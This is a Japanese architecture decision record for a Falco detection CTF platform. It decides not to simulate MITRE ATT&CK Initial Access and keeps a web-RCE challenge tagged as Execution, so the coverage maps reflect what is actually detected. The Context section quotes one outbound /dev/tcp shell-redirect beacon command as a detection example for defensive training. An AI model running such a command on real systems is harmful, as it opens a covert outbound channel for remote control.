# ADR-0015: Initial Access (MITRE ATT&CK TA0001) は challenge の模擬対象から除外する

- Status: Accepted (2026-08-26, VP 承認)
- Date: 2026-08-26
- Deciders: architect (提案・技術判断), VP (承認済み)
- 関連: REFACTORING.md P27 の ATT&CK 成長優先順位表 (「Initial Access (模擬) | 中 (要 architect 判断)」行)。
  新規 ADR — 他 ADR を supersede しない。

## Context

REFACTORING.md P27 の成長優先順位表が Initial Access (TA0001) の模擬可否を
architect 判断待ちとして保留していた
(`REFACTORING.md:1330` 相当、"中 (要 architect 判断) | Initial Access (模擬) | I9 の中で表現可能か要検証")。

前例として引かれている `challenges/06-web-rce-shell` を実測した:

- `challenges/06-web-rce-shell/README.md:3-4,8-9` — 「Web サーバの RCE で shell を取った」
  状況を **fixture スクリプト (`fake-httpd.sh`) を参加者が手動実行**して再現する。
  実 Web サービスは存在しない (I9 = challenge Dockerfile に Service/Ingress を追加しない、
  `falco-ctf-app-conventions.md:31`)。
- `challenges/06-web-rce-shell/journey.yaml:6-11` の briefing は「Web サーバには…脆弱性がある」
  「Runtime.exec() 経由で OS シェルが起こせる典型的な Web RCE」と**侵入の物語**を語る。
- しかし `challenges/06-web-rce-shell/falco-rule.yaml:8-11` の `attack:` ブロックは
  `tactic: "Execution"` / `techniqueId: "T1059.004"` (Unix Shell) であり、
  **Initial Access ではなく Execution にタグ付けされている**。これは正しい —
  Falco の `Run shell untrusted` ルールが実際に観測しているのは「シェルの親プロセス名が
  httpd 系である」という**実行時の状態**であって、外部からの HTTP リクエストで
  脆弱性を突く行為そのものは一切観測していない (そのイベントは存在しない — 参加者は
  fixture を自分の shell から手動実行するだけ)。narrative (侵入の物語) と
  detected technique (観測された挙動) は意図的に分離されている。
- schema 実測: 全 12 challenge の `falco-rule.yaml` `attack:` ブロックは
  `tactic` / `techniqueId` を **1 件ずつ**しか持たない (grep 実測、配列化されていない)。
  多重タグは現行 schema では表現できない。
- 対比として `challenges/08-c2-beacon/README.md:10-13,27-30` は
  `bash -c 'exec 1<>/dev/tcp/8.8.8.8/53'` という **outbound** の `dup2(socket, stdout)` を
  Falco が検知する例で、これは Service/Ingress なしでも Falco がネットワーク関連の
  syscall (socket/connect/dup) を観測できることを示す。ただしこれは C2 (outbound、
  Command and Control) であり、Initial Access (inbound、外部から境界を越えて
  侵入すること) とは方向が逆で、この事実は Initial Access の実現可能性を支持しない。

構造的な論点: Initial Access というタクティクは定義上「境界の外から内へ入る」行為を
指す。しかし本 CTF の challenge Pod には、参加者にとって観測可能な「外」が存在しない
— 参加者は最初から ttyd 経由でシェルを渡されている (プラットフォームの正当な
オンボーディングであり、模擬すべき攻撃ではない)。加えて I9 が Service/Ingress を
禁じているため、Falco が監視できるのは常に「コンテナ内で完結する syscall」であり、
外部からの侵入イベント (実際に到達したネットワーク接続・認証の成立など) を観測する
対象そのものが存在しない。

## Options

1. **新規 Initial Access challenge を追加する** (候補: T1190 Exploit Public-Facing
   Application / T1133 External Remote Services / T1078 Valid Accounts の模擬)
   - 変更点: challenge 番号 12 を新設し、06 と同型の fixture スクリプトで
     「侵入時の artifact」を模擬する。
   - コスト: 既存 1 challenge 分と同等 (falco-rule.yaml + rule.yaml + fixtures +
     journey.yaml + README + ATT&CK タグ)。
   - リスク: 検証すると、どの候補も本質的に既存カテゴリの言い換えにしかならない。
     T1190 は 06 と同型 (Execution の再演)。T1133/T1078 は「外部から接続された」
     「盗んだ資格情報でログインした」という事象自体を Falco が観測できない
     (実際に listening service を晒すか、認証イベントを K8s exec/ttyd セッション
     開始と区別する手段が必要で、後者は「参加者自身の正当なログイン」を攻撃と
     見なす矮小化になり CTF の前提と矛盾する)。ATT&CK Navigator レイヤが
     「Initial Access covered」と表示するようになるが、実態は Execution/Discovery
     相当の検知の言い換えであり、**カバレッジ表示が実際の検知内容から浮離する**
     (spec に実装していない事実を書く問題と同型のリスク)。
   - 効き始める閾値: I9 が緩和され challenge Pod への実サービス露出が別途許可された場合、
     初めて真の意味の Initial Access 模擬 (実際に外形的に exploit されるサービス) が
     成立する。
2. **06 の ATT&CK タグを Initial Access (T1190) へ差し替え or 二重付けする**
   - 変更点: `falco-rule.yaml` の `attack:` を配列化するか、tactic を複数持たせる
     schema 拡張。06 を T1190 (Initial Access, primary) + T1059.004 (Execution,
     secondary) に。
   - コスト: schema 拡張 (`catalog.go` は非strict yaml なので読み込みは低コストだが、
     `gen-attack-layer.py` / Navigator layer / `ATTACK-COVERAGE.md` 生成ロジックの
     対応が必要、中)。
   - リスク: 高い。Falco が実際に検知しているのは「shell の親プロセスが httpd 系」
     という Execution 挙動であり、外部から HTTP 経由で脆弱性を突く行為そのものは
     一度も観測されていない。タグを Initial Access にすると「この検知は Web 侵入を
     検知した」という、実際に検出していない事象を検出したと主張することになる。
     可逆 (タグを戻すだけ) だが、一度「Initial Access covered」とラベル付けすると、
     ATT&CK Navigator レイヤや報告資料を信じる読み手 (CEO/監査/セールス) を誤導する。
   - 効き始める閾値: ATT&CK coverage の外部提示 (監査対応・セールス資料・認定要件)
     で「Initial Access を含む網羅」を主張する必要が生じた場合。現状そのような
     用途はない。
3. **(推奨) Initial Access は模擬不可と判定し、`ATTACK-COVERAGE.md` の
   「意図的に扱わない領域」表に追記する。06 のタグは変更しない
   (Execution / T1059.004 のまま)**
   - 変更点: `scripts/gen-attack-layer.py` の `INTENTIONAL_GAPS` リストに 1 行追加し
     `make gen-attack` で再生成 (実装は該当 Engineer)。REFACTORING.md P27 表の
     「要 architect 判断」を「除外判定済み」に更新 (VP 記帳)。
   - コスト: 最小 (生成器への 1 行追加 + ドキュメント更新)。
   - リスク: 低。可逆 (将来 I9 が緩和されるか、Falco の観測範囲が変わったら
     Signposts に従い再訪できる)。
   - 効き始める閾値: 即時。

## Decision

**Option 3。**

理由: Initial Access は「境界の外から内へ入る」行為を指すが、この challenge Pod には
観測可能な「外」が構造的に存在しない (参加者は最初から ttyd 経由でシェルを渡されている
— それ自体が模擬すべき攻撃ではなくプラットフォームの正当なオンボーディング)。加えて
I9 が Service/Ingress を禁じているため、Falco は常にコンテナ内で完結する syscall しか
観測できない。06 の fixture パターンは「侵入後の実行挙動」を模擬しているに過ぎず
(falco-rule.yaml は正しく Execution/T1059.004 と記録している)。これを Initial Access
として再タグ付けする (Option 2) ことは実際に検出していない事象を検出したと主張する
ことになり、新規 challenge を追加する (Option 1) としてもこの構造的制約からは
逃れられない — 検討した候補技術はいずれも (a) 実サービス露出を要求して I9 に
違反する、か (b) 単に既存 Execution/Discovery/C2 挙動の言い換えになるかのいずれか
に収束する。

## Consequences

- 何を諦めたか: ATT&CK Enterprise の TA0001 (Initial Access) カバレッジ。
  `attack-navigator-layer.json` は Initial Access が赤く塗られないままになる。
- 新たに守る invariant: なし。Hard Invariant への昇格は行わない (I9 の帰結を
  明文化するだけであり、新しい機械強制対象ではない)。
- runbook への影響: `ATTACK-COVERAGE.md` の「意図的に扱わない領域」表への 1 行追加
  (生成器経由)。既存 challenge のタグ・journey 文言・fixture は無変更。

## Signposts (この決定を覆す観測可能な信号)

- I9 が将来緩和され、challenge Pod への Service/Ingress の実配線が別途許可された場合
  → 実サービスを晒す T1190 型 challenge が技術的に成立するため本 ADR を再訪する。
- ATT&CK coverage の外部提示 (監査対応・認定要件・セールス資料) で
  「Initial Access を含む全 tactic 網羅」が要件化された場合 → Option 1/2 の
  コスト再評価が必要になる。
- Falco の公式ルールセットに「inbound accept をトリガとする検知」が追加され、
  単一 Pod 内の自己ループ接続でも意味のある区別が可能になった場合 (2026-08-26
  時点でそのような公式ルールは存在しない) → 再評価。
- 新シナリオ設計で「参加者に最初から与えられている ttyd shell そのものを侵害イベント
  として扱う」ストーリー上の要請が product-engineer から出た場合 → Option 1 の
  再検討 (ただし検知の真正性は変わらない点を踏まえる)。

## Verification

無し。本決定はドキュメント/生成器の定義変更のみであり、「決定が守られているか」を
機械的に検査する対象が存在しない (Hard Invariant への昇格は行わない — 上記の
歯止め規則どおり)。

## Advice

- product-engineer への助言 (2026-08-26, architect): 新シナリオの narrative 設計で
  「Web RCE」のような Initial Access の**物語**を使うこと自体は問題ない (06 が
  既に実証している)。ATT&CK タグだけは Execution/Discovery 等の実際の検知内容に
  忠実に保つこと。
- security-engineer への確認を推奨: 本判断は I9 (Service/Ingress 禁止) の帰結を
  辿った設計判断であり、新たなセキュリティ境界の変更ではない。ただし ATT&CK
  coverage 表が監査文書として外部利用される可能性を踏まえ、追認を推奨する
  (非拘束の助言として記録。2026-08-26, architect)。
